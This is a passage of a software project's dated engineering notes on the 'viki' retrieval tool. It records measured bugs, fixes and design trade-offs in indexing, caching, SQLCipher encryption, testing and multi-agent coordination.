TODAY    23:00       mine  full timestamp, owed late TODAY
1 overdue, 1 due today
```

**This is the ledger being wrong in the direction of anxiety**, which is the one
direction it must not fail in — `build/promise-probe.sh`'s own header says a
promise reading as owed when it is not is what the product exists to remove.

### Why 24 green assertions missed it

Every existing fixture uses a full ISO timestamp: `LATE`, `SOON` and `FAR` are
all `...T12:00:00Z`. The bug is only reachable through the shape a *person*
writes, `@due 2026-08-26`, and no fixture wrote one. P12/P13/P14 now do, with
controls in both directions (a past bare date is still OVERDUE; tomorrow is
neither). P12 fails against the pre-fix binary, 26/1 — measured, not assumed.

---
## The keyword leg's problem was DEPTH, not selectivity -- and dropping stopwords made it worse

2026-08-26. Recorded because the obvious fix is wrong, and the diagnostic that
suggests it is phrased in a way that invites it.

`test/retrieval-eval.sh` reports that the OR-of-terms MATCH selects a **median
of 244 of 245 chunks**, 42 of 43 queries matching >90% of the corpus, and says
"BM25 is ranking the whole corpus, not a candidate set". That reads like a
defect. The natural fix is to stop OR-ing stopwords -- and `viki_ask.c` already
has `lit_is_stop()`, used by the literal leg, sitting a few functions away.

### It was built, and it is a regression

Same corpus (`fp 1b1e3c962c1e8cad`), varying only the binary:

| | recall@1 | recall@5 | recall@k | MRR | held-out recall@1 |
|---|---|---|---|---|---|
| OR every term | **0.349** | 0.512 | 0.698 | **0.424** | **0.417** |
| stopwords dropped | 0.302 | 0.488 | 0.628 | 0.384 | 0.333 |

Reverted. **`bm25()` already discounts a common term by IDF**, so a stopword's
contribution is small AND in the right direction: it is weak evidence that a
chunk is on topic, and deleting it deletes evidence. Matching many chunks is
not a defect when the ranking function is sound -- it is what BM25 is for.

### What actually helped: pool depth

`KEYWORD_TOO_DEEP` -- gold chunk matched, but below the candidate cutoff -- is
a *depth* failure and responds to depth:

| pool | recall@1 | recall@5 | recall@k | MRR | held-out recall@k |
|---|---|---|---|---|---|
| 40 | 0.349 | 0.512 | 0.698 | 0.424 | 0.833 |
| **80** | 0.349 | **0.558** | **0.744** | **0.434** | **0.917** |
| 160 | 0.349 | 0.558 | 0.721 | 0.432 | 0.917 |

`VIKI_CANDIDATE_POOL` is now 80. recall@1 does not move and should not: deeper
candidates can only rank below the ones already found.

### The wrong assumption it replaces

That a keyword leg matching almost everything is ranking badly. It was ranking
fine and being *truncated* early. The leg's problem was never how many chunks
it matched, it was how few of the ranking it was allowed to keep.

---
## The eval harness carried its own copy of viki's query builder, and it rotted on cue

2026-08-26. `test/retrieval-eval.py` reimplemented `build_or_query()` in Python
and hardcoded `CANDIDATE_POOL`. Both are the failure this repo keeps naming:
one claim in two files, rotting in one.

It bit within the hour. After the stopword experiment above changed the C, the
harness went on reporting **the same selectivity figure** -- because it was
describing its own model of a query viki was no longer running. The
`KEYWORD_TOO_DEEP` count did the same thing when the pool moved 40 → 80: it
stayed at 5 until the mirror was removed, then correctly fell to 4.

The recall/MRR numbers were never affected -- those shell out to a real
`viki ask` -- so the damage was confined to the *diagnoses*, which is precisely
the part an agent reads to decide what to fix next.

Fixed by asking the binary: `viki fts-query "<q>"` prints the MATCH expression
the keyword leg runs, and `viki fts-query --pool` prints the candidate depth.
Both hidden. The harness falls back to its local copy for a binary too old to
have them -- and **announces the fallback**, because comparing an old build
against a new one is a thing this harness exists to do.

---
## `--k` changed WHICH results won, not just how many were shown

2026-08-26. Found while measuring chunk overlap, in a probe that had been
passing for weeks against a fixture built to catch exactly this class of thing.

`viki_ask_query_opts()` sized its candidate pool as
`min(topK * 4, VIKI_CANDIDATE_POOL)`, so every retrieval leg fetched fewer
candidates for a smaller `k`. Fusion then ran over a different input set and
produced a different ORDER -- not a truncation of the same order.

### Repro

`build/literal-probe.sh`'s fixture: one 20-chunk document (`dense.md`) on the
same topic, contesting one chunk that names an identifier (`passing.md`).

```
$ viki ask "how does framed_next parse the counted framing" --k 10
[1] dense.md   [2] passing.md   [3..10] dense.md

$ viki ask "how does framed_next parse the counted framing" --k 5
[1..5] dense.md                          <- passing.md is GONE, not demoted
```

**Asking for fewer results removed a rank-2 hit entirely.** No caller predicts
that from a parameter named `k`, and an agent that narrows `k` to save context
would silently lose the answer it was narrowing toward.

### The wrong assumption it replaces

That `k` is a display parameter. It was a retrieval-depth parameter wearing a
display parameter's name. The pool array is `VIKI_CANDIDATE_POOL`-sized
regardless, so the shallow pool bought no memory -- only a little less SQL.

Fixed: `poolSize = VIKI_CANDIDATE_POOL` always, so `k` truncates a
fixed-depth ranking and results are a true prefix (verified k=3 ⊂ k=5 ⊂ k=10).

**It was invisible at the eval's own default.** `test/retrieval-eval.sh` runs
at `k=10`, where `min(10*4, 40)` is already 40 -- so the harness measured the
fixed pool and the old one as identical, and could never have caught this. The
probe with a hostile fixture did.

---
## Chunk overlap: the measured fix for RIGHT DOCUMENT, WRONG CHUNK -- and it is a trade

2026-08-26. Same corpus, `corpus fp 1b1e3c962c1e8cad`, varying only the binary,
which is the only comparison this harness supports.

| overlap | chunks | recall@1 | recall@5 | recall@k | MRR | coverage-closed r@1 | held-out r@1 |
|---|---|---|---|---|---|---|---|
| 0 | 194 | 0.256 | 0.535 | 0.698 | 0.381 | **0.333** | 0.333 |
| 5 | 218 | 0.326 | 0.488 | 0.651 | 0.401 | 0.267 | 0.417 |
| **10** | 245 | **0.349** | 0.512 | 0.698 | **0.424** | 0.200 | 0.417 |
| 20 | 343 | 0.326 | 0.535 | 0.628 | 0.420 | 0.267 | 0.417 |

10 is the setting: best recall@1 and MRR, recall@k level with the baseline,
+26% chunks. 20 costs +77% chunks and buys nothing.

### Two honest qualifications

**The predicted mechanism is only weakly supported.** The hypothesis was that
overlap stops an answer being cut away from the vocabulary that finds it, which
should collapse RIGHT DOCUMENT, WRONG CHUNK. That count barely moved: 21 of 43
to 20 of 43, with rank-1 instances 11 to 9. What actually improved is the
VECTOR leg -- "fusion helped" went 3 to 5 and "fusion HURT" went 2 to 0. A
window with more surrounding context embeds better; that is a different claim
from the one the change was made on, and it is the one the data supports.

**It costs the coverage-closed class**, whose answers live in check-in
comments, tech notes and attachments: recall@1 0.333 to 0.200, MRR 0.513 to
0.413. Those artifacts are short -- one chunk either way -- so they gain
nothing from overlap while competing against 26% more file chunks. The net over
both reports is roughly +4 queries and -2 on n=43/n=15, which is a real gain and
a thin one; it is deterministic, not sampled, but it is four queries.

---
## chunk_params is missing from the cache key, so two peers that chunk differently silently double-index the same lines

2026-08-26. Found while measuring P0.4 (retrieval quality), and it is a
**blocker on the fix that measurement points to** rather than a live bug: every
peer today compiles the same `VIKI_CHUNK_LINES 40`, so nothing is corrupt right
now. It goes wrong the moment anyone changes chunking, which is exactly what
the P0.4 numbers argue for.

D-11 says an embedding is a deterministic function of
`(content_hash, model_id, chunk_params)`. The cache key is
`PRIMARY KEY(content_hash, model_id, chunk_ix)` (`viki_db.c:32`) and the
skip-if-present test is `content_hash=?1 AND model_id=?2`
(`viki_index.c:299`). **`chunk_params` appears in neither.** So the cache
cannot tell two chunkings apart, and `cache_merge_in`'s
`INSERT OR IGNORE` (`viki_cache.c:1094`) resolves the collision by
first-writer-wins on rows whose text is different.

### Repro

One 100-line document, byte-identical on both peers, so identical
`content_hash`. Peer A built with `VIKI_CHUNK_LINES 40`, peer B with `20`:

```
A (40-line): 3 chunks   chunk 1 starts "line 41"
B (20-line): 5 chunks   chunk 1 starts "line 21"      <- same key, different text
```

B pushes, A pulls (`viki cache push/pull --no-model`, the real path):

```
chunk_ix  starts at   lines
   0      line 1       40     <- A's
   1      line 41      40     <- A's
   2      line 81      20     <- A's
   3      line 61      20     <- B's, OVERLAPS A's chunk 1
   4      line 81      20     <- B's, DUPLICATES A's chunk 2

$ SELECT count(*) ... WHERE chunk_text LIKE '%line 81%'
2
```

**Lines 61-100 are now indexed twice, and nothing says so.** Consequences:
near-duplicate hits eat top-k slots, RRF double-counts one document, and the
`chunk_ix of chunk_count` that `serve` and `ask` display becomes meaningless
(chunk 2 of 5 for a document that has either 3 chunks or 5, never both).

### The wrong assumption it replaces

SYNC.md 1 claims viki's cache "passes by construction rather than by luck"
because the chunk key is `(content_hash, model_id, chunk_ix)` and D-11 makes
the row a deterministic function of exactly those. That is true only while
`chunk_params` is a global constant. It is a *compile-time* constant, which
reads like a guarantee and is actually an unenforced precondition: grow-only
union is safe when a collision means the rows are EQUAL, and here a collision
means they are different.

### The fix, taken 2026-08-26

Warren: *"bump the model"*. The stored key is now
`"<model_id>/c<chunk_lines>"`, derived once by `viki_cache_epoch_id()`
(`embed.c`). Differently-chunked peers merge as two epochs — ordinary,
disclosed cache fragmentation — instead of silently corrupting one. The same
repro now yields:

```
none/c20 | 5 chunks     each epoch complete and internally consistent
none/c40 | 3 chunks     no collision, no double-indexed lines
```

`build/cache-probe.sh` E1–E4 is the standing proof. Composed at the cache layer
rather than folded into the manifest's `model_id`, because that value is
**distributed** (D-12's epoch pin, signed) and a local compile-time constant
must not quietly rewrite what the pin says.

**Two things this cost, both worth recording because both were found by
measurement rather than by reading the diff:**

1. **The first cut composed the key only in the WRITER.** `viki ask`'s vector
   leg went on filtering by the bare model id, matched nothing, and hybrid
   retrieval silently became BM25-only. m1's B2/B5/B7/J4 caught it. That is why
   the derivation now lives in one function in `embed.h` used by every writer
   and every reader, rather than being spelled out where it is needed.
2. **Every pre-existing cache loses its vector leg until re-indexed** — and
   `ask` went on announcing "hybrid mode" while doing so. Found by re-running
   `test/retrieval-eval.sh` against an existing corpus and seeing hybrid score
   *exactly* the BM25-only control. `viki ask` now checks its own announcement:
   no vectors under this epoch, but some under another, prints a loud WARNING
   naming both. The cache is derived (D-10), so `viki index` is the whole fix.

---
## A third retrieval leg turned an m1 assertion into a coin flip, and one green run hid it

2026-08-24. Recorded because the failure mode is "the suite is green sometimes"
and that is the hardest kind to notice.

`viki ask` gained a LITERAL leg (QUEUE 42). m1's **C14** asserts a ticket is
rank 1 in a fresh clone. A ticket and its CHANGE RECORD (`tchg:`) carry
near-identical text -- the change record quotes the comment and title verbatim
-- so they are always adjacent in any ranking. With two legs they happened to
order ticket-first. With three:

```
[1] rrf=0.0489  tchg:20444ff9...      = 1/61 + 1/61 + 1/62
[2] rrf=0.0487  ticket:3736d13c...    = 1/61 + 1/62 + 1/62
```

A **0.4% margin**, which flips on nothing more than which leg ranks which first.
Measured on one unchanged binary: **90/0/0 once, then 89/1/0 twice.**

**The dangerous part was the single green run.** It came first, and it was the
one quoted in a commit message. A suite that passes 1-in-3 reads as "passing
with an occasional blip" rather than "a real assertion is broken", and the
natural response -- re-run it -- rewards the wrong conclusion. Running m1 THREE
TIMES is what turned an anomaly into a diagnosis, and is cheap enough
(~35s each) to be the default when a retrieval change lands.

**The fix was to correct the claim, not to loosen it.** Rank 1 was never the
property worth asserting: the DoD claim is that TICKET CONTENT SURVIVES THE
PUSH/PULL ROUND TRIP into a fresh clone, and top-two proves that exactly as
well. Asserting a coin flip is not a stronger test, it is a flaky one. C14 now
checks the top two and says why in eleven lines, so nobody tightens it back.

**The general trap:** adding a retrieval leg re-orders every near-tie in the
corpus. Any assertion pinned to rank 1 on documents with overlapping text is a
latent coin flip, and it will not announce itself. After a ranking change, look
for assertions whose margin is under ~1% rather than only for the ones that
went red.

---

## Doc rot is not always decay: a claim can be FALSE ON ARRIVAL when parallel agents integrate, and this repo has at least one

2026-08-23. Found by an undirected `viki muse` sweep of the repo's own cache
(QUEUE 44), which is the first time this project's own tool found a defect in
this project.

`test/retrieval-corpus.sh` told its reader that check-in comments are "NOT
indexed ... the single largest coverage gap in `viki index`" and carried a
two-column table listing five classes as un-indexed. All of them were indexed.
The interesting part is WHEN:

```
$ git log -S "NOT indexed by viki today" --oneline -- test/retrieval-corpus.sh
$ git log -S "index_unversioned" --oneline -- src/viki_index.c
# both resolve to the SAME commit: 4292a0a
```

One agent wrote the corpus while another closed the coverage gap, and the two
halves were integrated in one commit without reconciling. **The comment was
never true.** There is no revision of this tree in which it described reality.

**Why that matters more than an ordinary stale claim.** Every rot-detection
instinct this repo has is time-shaped: check the date, re-measure, "entries are
dated snapshots". None of that finds a claim that was wrong at birth, because
there is no before-state where it was right and no edit that made it wrong.
`git log -S` on the claim text is what finds it, and the tell is that the claim
and its own refutation land in the same commit.

**It spread, which is the ordinary part.** By the time it was found the same
false premise sat in AGENTS.md ("the non-file artifacts are there because
`viki index` cannot read them -- that gap is the measurement") and in CLAUDE.md
("0 of 16 questions ... are answerable at all"), while AGENTS.md ELSEWHERE said
the gap was "Mostly closed". A doc that contradicts itself is the signature.

**The structural lesson, and it is uncomfortable.** This repo's defence against
rot is to write everything down in the same commit as the code. That discipline
is also the mechanism: more replicas means more places for a torn write to land,
and parallel agents make torn writes normal rather than exceptional. The fix
applied here was to DELETE the transcribed figures rather than update them --
CLAUDE.md now points at `test/retrieval-eval.sh`'s report instead of restating
its numbers, because a number that can be regenerated should not be replicated
into prose at all. **The cheapest way to stop a claim rotting is to have one
copy of it, and the second cheapest is to have none and a command that prints
it.**

---




## A SQLite blob can back a database but can never be mmap'd, and SQLCipher turns the mmap path off per-pager rather than at build time

2026-08-21. Recorded because "keep the cache inside the repo and query it in
place" is an idea that will recur, and two of the three reasons it fails are
not obvious.

**Recursion is real and supported.** SQLite reaches its file only through the
VFS (`xRead`/`xWrite`/`xTruncate`/`xFileSize`/`xLock`/`xSync`); nothing in
that interface says "file", so an inner database backed by
`sqlite3_blob_read()`/`sqlite3_blob_write()` on an outer one is a legitimate
construction. `ext/misc/appendvfs.c` in the sqlcipher tree does the adjacent
thing (a database at an offset inside another file -- how `sqlite3 --append`
and SQLite Archive work). Two constraints bite: `sqlite3_blob_write()` CANNOT
resize, so the inner db can never exceed its `zeroblob(N)` preallocation, and
any statement modifying that row invalidates the handle (`SQLITE_ABORT`).

**mmap of a blob is impossible, and it is structural.** Past the in-cell
prefix a blob becomes an OVERFLOW CHAIN: a singly linked list of pages, each
opening with a 4-byte big-endian next-page pointer. Measured, 100,000-byte
blob at `page_size=4096`:

```
$ sqlite3 t.db "PRAGMA page_size=4096; CREATE TABLE t(id INTEGER PRIMARY KEY, b BLOB);
                INSERT INTO t VALUES(1, randomblob(100000));"
$ sqlite3 t.db "SELECT name,pagetype,count(*) FROM dbstat GROUP BY name,pagetype;"
t|leaf|1            <- 2085 bytes in-cell
t|overflow|24       <- 24 pages x 4080 bytes
$ od -An -tu1 -j $((2*4096)) -N4 t.db     # page 3 -> next
            0   0   0   4
$ od -An -tu1 -j $((25*4096)) -N4 t.db    # page 26 -> end of chain
            0   0   0   0
```

So there is no `(offset, length)` to hand `mmap`: the payload is interrupted
by a pointer every page, and the pages need not be adjacent (they were only
because the file was fresh). `sqlite3_blob_read()` exists to walk that chain.
(4080 rather than the stock 4092 because macOS's system `sqlite3` reserves 12
bytes/page -- header offset 20. Stock SQLite gives 4092.)

SQLite does mmap, but the OUTER file: whole pages, read-only, via
`xFetch`/`xUnfetch` (`sqlite3_io_methods` v3). Pointers to file pages, never
to blob payloads.

**And SQLCipher disables that path per-pager, not at build time.** The
expectation going in was a build-time `SQLITE_MAX_MMAP_SIZE=0`; that define
exists in `sqliteInt.h` but is guarded by `__OpenBSD__ || __QNXNTO__` and is
stock SQLite, nothing to do with the codec. The real switch is in
`setGetterMethod()`, and it is SQLCipher's own marked delta --
`vendor/sqlcipher-libressl/src/pager.c:1074`:

```c
  }else if( USEFETCH(pPager)
/* BEGIN SQLCIPHER */
#ifdef SQLITE_HAS_CODEC
   && pPager->xCodec==0
#endif
/* END SQLCIPHER */
  ){
    pPager->xGet = getPageMMap;
```

Correct -- a mapped page is ciphertext, so bypassing the codec would hand out
garbage -- but it means the SAME BINARY takes the mmap path on a plaintext
repo and the normal path on an `.efossil`. Same control shape as m1's E2/E3b.

**What this rules out concretely.** Querying `.viki/cache.db` in place as a
`uv:` blob inside the repo, skipping `viki cache pull`'s export, is blocked
twice over and the VFS is neither reason: (1) fossil stores unversioned
content zlib-compressed behind a 4-byte BE length prefix when `encoding=1`
(`viki_index.c:1682`, measured), so the blob is a deflate stream and not a
database image at all -- decompressing IS extracting; (2) the outer repo is
SQLCipher, so its pages are ciphertext and there is no mapping to hand out.
`cache pull` exporting to a real file is the right shape.

**What it does NOT rule out:** `sqlite3_deserialize()`. Read the bytes into
memory once and SQLite treats the buffer as a database with no VFS and no
file. Present in the pinned amalgamation (3.53.4; `SQLITE_OMIT_DESERIALIZE`
is not defined and `build/build.sh` does not define it). See QUEUE 36.

**Settled the same day, so this does not read as an open door.** The reason
to want query-in-place was lightweight recursive search across many repos --
"don't open everything to find your socks". Measured, that premise is false:
opening an encrypted repo costs 5.99 ms (5.71 ms plaintext), and ATTACHing
all three real caches on this machine and scanning across them costs 3.4 ms.
Per-repo centroid pruning was then built and measured against a full-scan
ground truth and it does not pay either -- the lossless radius bound prunes
1-9% of a 384-dim space, and the approximate form drops 22-31% of true top-1
answers (QUEUE 39 has the table). **The shape is extract -> cache -> search**,
paid for by locality of reference: a compressed blob has to be extracted to be
searched at all, and if you looked once you will look again soon. That is
already what viki does.

---






## sqlite-vec was built, measured, and reverted: ndvss is the MORE portable engine, and wasm is why that matters

2026-08-21. Recorded so nobody repeats the exercise. The swap was
completed and CI-green on all eight jobs -- it was reverted on cost/benefit,
not because it failed.

**What it bought, measured rather than argued:**

- Retrieval quality: **identical**. Both engines score `recall@1=0.209
  recall@5=0.488 recall@k=0.674 MRR=0.338` on `corpus fp
  94b0908c4729bc2c` (same corpus, `VIKI_BIN` varied).
- Algorithmic improvement: **none**. sqlite-vec 0.1.9 has no ANN index --
  its only `hnsw` mention is a credit comment on a borrowed NEON kernel.
  Both engines are brute-force scans.
- Speed: **never measured**, which is itself the finding. The swap was
  argued for partly on engine quality without that number.

**What it cost:**

- **A Windows patch, where ndvss needed none.** `sqlite-vec.c:64` reads
  `#ifndef _WIN32 / typedef u_int8_t uint8_t;` -- "not Windows implies the
  BSD spellings exist". viki builds under MSYS2's **plain MSYS**, not
  MINGW64, deliberately (`fork()`, BSD sockets), and plain MSYS does not
  define `_WIN32`. So sqlite-vec takes its Unix branch on a platform with
  `uint8_t` and no `u_int8_t`. viki is neither case upstream considered.
- **Loss of wasm SIMD.** ndvss ships `similarity_functions_wasmsimd.h`
  alongside neon/sve2/rvv/avx/sse41 kernels. An eventual wasm build --
  here and for other consumers -- gets that for free from ndvss and would
  have to be redone against sqlite-vec. **This is the durable reason, not
  the arm64 bug.**

**And the arm64 bug that motivated the whole thing is a five-line fix.**
The SVE2 definitions are compile-time gated
(`#if defined(__aarch64__) && defined(__ARM_FEATURE_SVE)`) while the Linux
dispatch was runtime-gated only (`getauxval(AT_HWCAP2)`), so a build
without `-march=...+sve` compiles the kernels out and still references
them. The **Windows AArch64 branch a dozen lines below already had the
right guard.** Fixed upstream in wmacevoy/sqlite-ndvss#1, verified both
directions in an `arm64v8/debian:bookworm` container (patched compiles;
unpatched fails with exactly the six undeclared-symbol errors), and CI's
linux-arm64 leg dropped `experimental: true` as a result.

**The reasoning error worth keeping.** CLAUDE.md said "do not fork
sqlite-ndvss", so a compile bug in it was treated as unfixable and the
conclusion became "replace the engine". But `vendor/sqlite-ndvss` **is
already Warren's fork** -- patching it is maintaining what this project
owns. A constraint read too literally turned a five-line fix into a
dependency swap. When a rule seems to force an expensive answer, check
whether the rule actually applies.

sqlite-vec remains the better long-term home IF quantization-to-shrink-sync
becomes a priority (it is the one benefit that survived, and it is
unbuilt). Revisit then, with wasm coverage as an explicit requirement.

---




## `command -v sqlite3` is not a test that sqlite3 can do what you need, and it hid a red CI job for six commits

`test/m1.sh` gated its database-corroboration assertions on

```sh
command -v sqlite3 >/dev/null 2>&1 && HAVE_SQLITE3=1
```

Three of them (`H11`, `H11b`, `J1`) query `chunk_fts`, which is a **plain
FTS5 virtual table**. A `sqlite3` built without the fts5 module cannot even
PREPARE that statement. The GitHub macOS runner ships exactly such a build:

```
Error: in prepare, no such module: fts5
test/m1.sh: line 91: [: : integer expression expected
```

Because the gate only asked whether the binary existed, the three ran, the
failed call substituted an **empty string**, and the comparison failed. The
job reported `87 passed, 3 failed, 0 skipped` -- which reads as *"viki did
not withdraw the chunks"*, the exact opposite of the truth. `H8`/`H9`/`H10`
assert the same withdrawal through `viki ask` and passed in the same run.

It stayed unexamined for six commits on `main` because the `m1` job shares
its red with `linux-arm64`, whose failure IS expected and documented (the
sqlite-ndvss SVE2 bug) -- so the run summary looked like a known problem.
It never reproduced locally: the stock macOS sqlite3 here (3.51.0,
`/usr/bin/sqlite3`) does have fts5.

Repro:

```sh
printf '#!/bin/sh\nfor a in "$@"; do case "$a" in *fts5*|*chunk_fts*)\n  echo "Error: in prepare, no such module: fts5" >&2; exit 1;; esac; done\nexec /usr/bin/sqlite3 "$@"\n' > /tmp/nofts5/sqlite3
chmod +x /tmp/nofts5/sqlite3
PATH=/tmp/nofts5:$PATH bash test/m1.sh
```

Fixed by probing capability (`HAVE_FTS5`, set only when `CREATE VIRTUAL
TABLE ... USING fts5` actually works) and keeping it separate from
`HAVE_SQLITE3` -- `E3`/`E3b`/`B2`/`C11` only need sqlite3 to OPEN a
database and must not be skipped over a module they never touch. With the
shim above the same run is now `87 passed, 0 failed, 3 skipped` and names
the missing module. CI additionally installs an fts5-capable sqlite3 on
macOS, because the job fails on any skip by design and three skipped
assertions prove nothing.

**The general claim: a presence check is not a capability check.** Every
`command -v` gate in this tree is a candidate for the same bug, and the
failure mode is not "the test skips" -- it is "the test runs, fails on
empty output, and blames the code under test".

---




## `db_open_repository()` does not register `content()`, so in-process SQL is NOT equivalent to `fossil sql`

Found 2026-08-21 while wiring `libfossilsee` into `fossil_sql_framed()`.

Fossil's `content()`, `compress()`, `decompress()` and
`gather_artifact_stats()` SQL functions are registered by
`add_content_sql_commands()` in `sqlcmd.c`, which the **`fossil sql`
command** calls -- not `db_open_repository()`. An embedder that opens a
repository directly gets a connection where `content()` does not exist.

Three of viki's seven extractors (`ckin:`, `note:`, `attach:`) call
`content()`. Through the in-process path they all failed with
`no such function: content`, which viki correctly read as "not
authoritative" -- so the run reported

```
viki index: not authoritative this run for ticket: forum: note: tchg: attach: uv:
```

where the subprocess path reported only `ticket: forum: uv:`. **Nothing
crashed and no error reached the user**; the extractors simply, silently,
stopped extracting, and the only visible symptom was three extra
namespaces in a line most readers skim.

Repro: open a repo with `db_open_repository()` and run
`SELECT content(uuid) FROM blob LIMIT 1;` -- `no such function: content`.
Fix: call `add_content_sql_commands(g.db)` after opening.

**The general claim, which is the part worth keeping:** "it opened the
same database" is not the same as "it is the same interface". Fossil
installs per-command SQL functions, and an embedding inherits none of
them by default. `build/fossilsee-probe.sh`'s E3 assertion (authority
verdicts identical down both paths) is what caught this, and it is the
assertion to keep if any others are ever dropped.

---

## `fossil_sql_framed()` dereferenced an optional out-param, crashing `viki index --since` outside a checkout

Found 2026-08-21 by inspection while adding the in-process path; present
in git `HEAD` at `src/viki_index.c:722`:

```c
if( rc != 0 ){ free(zOut); *pnOut = 0; return NULL; }
```

`pnOut` is optional and `repo_probe()` passes NULL (line 804). `rc != 0`
is reachable: `fossil sql` exits nonzero when the **repository cannot be
opened**, which is exactly what happens outside a checkout --

```
$ cd /tmp/empty && fossil-see sql --readonly "SELECT 1;" ; echo $?
1
```

-- and `run_capture()` returns a non-NULL empty buffer there, so the
earlier `if( !zOut ) return NULL;` does not save it. `viki index --since
auto` in any non-checkout directory therefore dereferenced NULL.

Fixed by guarding the store. Worth noting how it survived: the crash needs
the `--since` path AND a directory with no repository, and every test in
the tree runs `--since` inside a checkout it just created.

---




## A raw 256-bit key makes an encrypted repo 52x cheaper to open, and needs no patch anywhere

**Date:** 2026-08-21. Every `fossil` invocation against an encrypted repo pays
SQLCipher's PBKDF2. Measured on this machine, 5 invocations of
`fossil sql -R <repo> "select 1"`:

| key form | per open |
|---|---|
| passphrase | **333 ms** |
| plaintext repo (control) | 5.8 ms |
| **raw `x'<64 hex>'`** | **6.4 ms** |

`FOSSIL_SEE_KEY="x'<64 hex chars>'"` works on the UNMODIFIED fossil-see binary:
SQLCipher recognises that literal form and skips derivation entirely. No
SQLCipher patch, no fossil patch, no rebuild.

**It is still genuinely encrypted**, checked three ways rather than assumed:
the file header is random bytes and not `SQLite format 3`, stock `sqlite3`
reports "file is not a database", and a different raw key fails NOTADB.

**Why this is not a weakening in the case that matters.** PBKDF2 exists to
make a LOW-ENTROPY HUMAN PASSPHRASE expensive to brute-force. A 256-bit
machine-generated key cannot be brute-forced at any iteration count, so
stretching it protects entropy the key does not have. The at-rest guarantee
is unchanged; what is given up is passphrase-brute-force resistance, which is
irrelevant when there is no passphrase.

So: **raw key for machine-to-machine** (a hub with a systemd credential per
D-8, agents, CI), **passphrase for human-typed**. Same binary, same repos, the
caller chooses. Do NOT use a raw key for a key a person types or remembers.

**What this costs the arguments built on top of it.** ~2.6 s of pure key
derivation per full index (8 extractors x 333 ms) was a main driver for
embedding fossil in-process. It is now ~50 ms. Anyone reaching for
`libfossilsee` on latency grounds should re-measure first; the remaining case
for it is mobile/FFI, where there is no shell to spawn into at all.

## PRAGMA data_version already answers "did another connection write?"

**Date:** 2026-08-21. Chasing change-observability after triggers proved inert
on fossil's sync path and `sqlite3_update_hook` proved per-connection.
Measured with a two-connection C probe:

```
baseline on conn A                  1
after A's OWN write                 1  unchanged
after a SECOND connection wrote     2  CHANGED   <-- what update_hook misses
after another write from B          3  CHANGED
```

`PRAGMA data_version` is stock SQLite, needs no patch, and is exactly the
cross-connection signal the other two mechanisms lack. It does not say WHAT
changed -- pair it with `blob.rcvid` for the delta, which is the same delta an
after-receive hook is handed (QUEUE.md 28-30).

Caveat that decides where it is useful: reading it requires an OPEN
connection, so out-of-process it does not avoid the cost of opening. It is
free for a long-lived connection -- which is the in-process case, and with a
raw key (above) it is cheap even out-of-process.

## Three agents on one branch: the work queue could not answer "what is free to take?"

**Date:** 2026-08-21. Three agents (alice, bob, carol) worked the `roleplay`
branch concurrently as separate clones sharing one remote, coordinating only
through the repository, with viki's own capture loop as the queue.

**What held.** Claim-by-push genuinely serialises: bob's first claim was
rejected, he pulled, re-read the queue, confirmed his task was still free, and
pushed -- the rejection arrived *before* he had done any work. Git's
non-fast-forward check is the lock, and there is no lock server. All three
wrote `captures/2026-08.md` concurrently with **zero conflicts**, because
`viki capture` appends and `viki structure` rewrites one `@key` line in place,
so edits to different notes are disjoint line ranges. Hand-editing would have
reflowed the file and conflicted -- the format is conflict-resistant by
accident rather than design, and two agents claiming the SAME note would still
conflict, which is the correct outcome.

**What did not.** All three independently found the same defect:

> `viki notes --state open` lists CLAIMED work. Claiming sets `~who` and never
> touches state, and `--who ""` cannot express "unclaimed" because an empty
> filter means "no filter on that field". **The one question a work queue must
> answer was the one it could not ask.**

Each avoided collision only by reading a `~who` marker by eye. Carol put it
best: an agent that trusted the documented command literally, took the top
result and started work would have collided with alice.

Three more gaps, each found by one agent and confirmed by the others' reports:

- **A claim carried no timestamp**, so an abandoned claim and a live one were
  indistinguishable, forever. No heartbeat, no expiry.
- **`git pull` does not refresh the queue.** The projection is derived, so a
  pulled claim stays invisible until `viki index` is re-run -- an agent can
  hold, unread, someone else's pushed claim on the task it is about to take.
- **`git pull --rebase` refuses while you have uncommitted work**, which is the
  entire duration of doing a task. "Pull before you look" is mechanically
  unavailable exactly when you most want to know what moved.

**What got built from it** (this commit): `--unclaimed` and `--stale`
filters; compare-and-set so `--who` REFUSES to overwrite another holder; and
a lease protocol in which the claimer declares its own responsiveness
(`--lease 1m` online, `--lease 2d` going to the north pasture) because viki
exists for peers that go offline and a fixed global timeout cannot tell
"offline" from "dead". A challenge is refused while a lease is live -- that
refusal *is* the niceness, enforced rather than hoped for -- and a steal
requires a lapsed lease plus an unanswered challenge aged past its grace, and
records `@stolen-from`. **A steal is a supersession, not an overwrite**: the
same spine as `--closes`, the `fprev` fix, and the 54-vs-90 contradiction.

**The behaviour I would most want to keep.** Alice, writing the probe for
`--bias old`, found a real bug in it -- `--from` pins the seed so the age
counters are never filled, and the reporting line claimed a selection that
never happened. She did *not* ship it as a red assertion. She filed it as a
capture task with the one-line fix and left the probe green, on the grounds
that "a probe that is red for a reason nobody can act on stops being read."
Carol, needing a modified binary, built into a scratch output directory rather
than running `build/build.sh`, which would have swapped `build/dist/viki` out
from under the other two mid-run. Neither hazard is written down anywhere;
both agents reasoned to them.

## A/B trial: viki vs grep on the same corpus -- a wash on cost, and the corpus mattered more than either tool

**Date:** 2026-08-20. Two agents, same 82-document corpus (`me.viki`: every
design doc, all 25 source files, every test/build script, and all 31 commit
messages as separate documents), same three questions, differing only in the
retrieval tool.

|  | viki | grep |
|---|---|---|
| tokens | 132,461 | 142,839 |
| tool calls | 39 | 60 |
| wall clock | 10.5 min | 8.4 min |

**Cost is a wash.** 7% fewer tokens, a third fewer calls, 25% slower. Both
workflows converged on the same shape: find the document, then read it by
hand (`sqlite3` pulls for one, `sed` for the other). Anyone justifying a
retrieval layer on token economics at this scale is arguing from a number
that is not there.

**THE COMPARISON WAS RIGGED IN GREP'S FAVOUR, and it is worth saying so.**
To make it fair I flattened commit messages, source files and artifacts into
markdown on disk. In real use five of nine indexed classes -- check-in
comments, tech notes, ticket changes, attachments, uv blobs -- are NOT files,
and grep cannot reach them without exactly the materialisation step I did by
hand. Grep's parity was purchased with a corpus-prep step viki does natively.

**Where viki won: the concept-shaped question.** "What must you not get wrong
when adding an artifact class?" has no keyword, no title, and no single
home. grep spent about two-thirds of its 60 calls on it and found the one
worked example (`MEMORY_DESIGN.md`) **by accident, while chasing a different
query** -- its own words: a semantic search "would have surfaced it
immediately." viki found the actual assignment brief in one query. `muse`
also earned its place: one undirected run surfaced the crispest statement of
the vector-leg mechanism, which six directed queries had missed.

**Where grep won: proving absence.** `grep stash` -> nothing. `grep
